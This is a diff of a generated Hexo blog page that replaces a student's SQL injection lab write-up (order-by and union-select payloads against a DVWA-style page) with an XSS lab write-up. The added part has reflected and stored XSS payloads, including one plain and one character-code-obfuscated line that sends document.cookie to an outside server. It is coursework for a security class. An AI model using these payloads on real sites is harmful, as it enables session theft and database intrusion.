@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>安全攻防综合实验8 - Hexo</title>
+  <title>安全攻防综合实验9 - Hexo</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -153,8 +153,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2021-11-09 22:06">
-      2021年11月9日 晚上
+    <time datetime="2021-11-16 21:47">
+      2021年11月16日 晚上
     </time>
   </div>
 
@@ -164,7 +164,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      425 字
+      319 字
     </span>
   
 
@@ -174,7 +174,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      4
        分钟
     </span>
   
@@ -205,28 +205,29 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>可以通过查看我的之前的blog：<a href="https://jhl328.github.io/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/" target="_blank" rel="noopener">https://jhl328.github.io/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/</a></p>
-<p>首先，查看<code>source code</code></p>
-<p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/1.png" srcset="/img/loading.gif" alt="1"></p>
-<p>可以看到用的是<code>post</code>方法来获取参数，用户只能通过选择来进行，不能进行输入</p>
-<p>当我们输入id（例如：1）之后，所构造的SQL的完整语句就是</p>
-<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span>;</code></pre>
+              <h4 id="参考blog："><a href="#参考blog：" class="headerlink" title="参考blog："></a>参考blog：</h4><p><a href="https://juejin.cn/post/6890532180885176334#heading-21" target="_blank" rel="noopener">跨站脚本攻击(XSS)详解</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1812929" target="_blank" rel="noopener">WEB安全(一)之图解XSS注入</a></p>
+<h4 id="反射xss"><a href="#反射xss" class="headerlink" title="反射xss"></a>反射xss</h4><p><img src="/2021/11/16/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C9/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p>high难度使用<code>preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</code>按照出现的顺序匹配掉了script</p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span></code></pre>
 
-<p>意思是在名为<code>users</code>的表中找到<code>user_id</code>这个列中内容为<code>&quot;1&quot;</code>的那一条数据的<code>first_name</code>以及<code>last_name</code>的值</p>
-<p>所以之后我们可以通过控制输入的参数id的值来调整执行的SQL语句</p>
-<p>输入<code>1&#39; order by 1#</code>，此时php所要执行的SQL语句就变为了</p>
-<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span><span class="hljs-comment">#';</span></code></pre>
+<p>首先，执行完之后可以看到有弹窗成功弹出</p>
+<p><img src="/2021/11/16/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C9/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>另外，发送到另一个网站的过程，我使用了同学的服务器来做，构造payload然后能够写入到文件当中</p>
+<pre><code class="hljs autohotkey">&lt;svg/onload=<span class="hljs-string">"eval('var a=`http://junxiaoqiong.cn/test.php? f=`+document.cookie;window.open(a)');"</span>&gt;</code></pre>
 
-<p>此时SQL会把#后面内容屏蔽来避免语句错误，但是此时会发现提示语法错误，会发现是由于’ 被转义为了\，之后注入的时候只需要输入<code>1 order by 1#</code>即可</p>
-<p>同时测试<code>1 order by 2#</code>，发现也成功，但是到了order by 3#的时候，会发现出现错误，说明这个名为<code>users</code>的表应该是2列</p>
-<p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/2.png" srcset="/img/loading.gif" alt="2"></p>
-<p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/3.png" srcset="/img/loading.gif" alt="3"></p>
-<p>接下来可以查看所有的数据库，输入<code>1 union select database(),user()</code></p>
-<p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/4.png" srcset="/img/loading.gif" alt="4"></p>
-<p>之后就能够通过上面相同的形式来查看表， <code>union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p>
-<p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/5.png" srcset="/img/loading.gif" alt="5"></p>
-<p>之后如果要查询当前表名的所有列，注意要进行转义，通过16进制可以实现</p>
-<p>之后high在本质上只是通过⼀个中转的session，通过向这个session的url注⼊，报错回显显示在之前的那个url⽽已。其实做法都一样</p>
+<p><img src="/2021/11/16/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C9/2.png" srcset="/img/loading.gif" alt="2"></p>
+<h4 id="储存xss"><a href="#储存xss" class="headerlink" title="储存xss"></a>储存xss</h4><p>之后在<code>Stored型XSS</code>攻击中，首先查看<code>source code</code></p>
+<p><img src="/2021/11/16/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C9/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p>可以看到在message中用了 <code>strip_tags</code> 函数直接转移了所有的<code>html</code>语言以及<code>addslashes</code>，name中过滤和上面一样</p>
+<p>尝试在name当中进行注入</p>
+<pre><code class="hljs routeros"><span class="hljs-attribute">btnSign</span>=Sign+Guestbook&amp;mtxMessage=123&amp;txt
+<span class="hljs-attribute">Name</span>=&lt;img <span class="hljs-attribute">src</span>=# <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;&lt;/img&gt;</code></pre>
+
+<p><img src="/2021/11/16/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C9/5.png" srcset="/img/loading.gif" alt="5"></p>
+<p>加分项的做法也是这样</p>
+<pre><code class="hljs angelscript">btnSign=Sign+Guestbook&amp;mtxMessage=<span class="hljs-number">123</span>&amp;txtName=&lt;img src=# onerror=eval(String.fromCharCode(<span class="hljs-number">0x77</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0</span>x <span class="hljs-number">65</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0</span>x <span class="hljs-number">61</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0</span>x <span class="hljs-number">70</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x3f</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x3d</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0</span>x <span class="hljs-number">2</span>e,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x29</span>););&gt;</code></pre>
+
 
             </article>
             <hr>
@@ -250,18 +251,12 @@
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2021/11/16/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C9/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">安全攻防综合实验9</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/">
-                        <span class="hidden-mobile">安全攻防综合实验7</span>
+                      <a href="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/">
+                        <span class="hidden-mobile">安全攻防综合实验8</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -400,7 +395,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "安全攻防综合实验8&nbsp;",
+        "安全攻防综合实验9&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
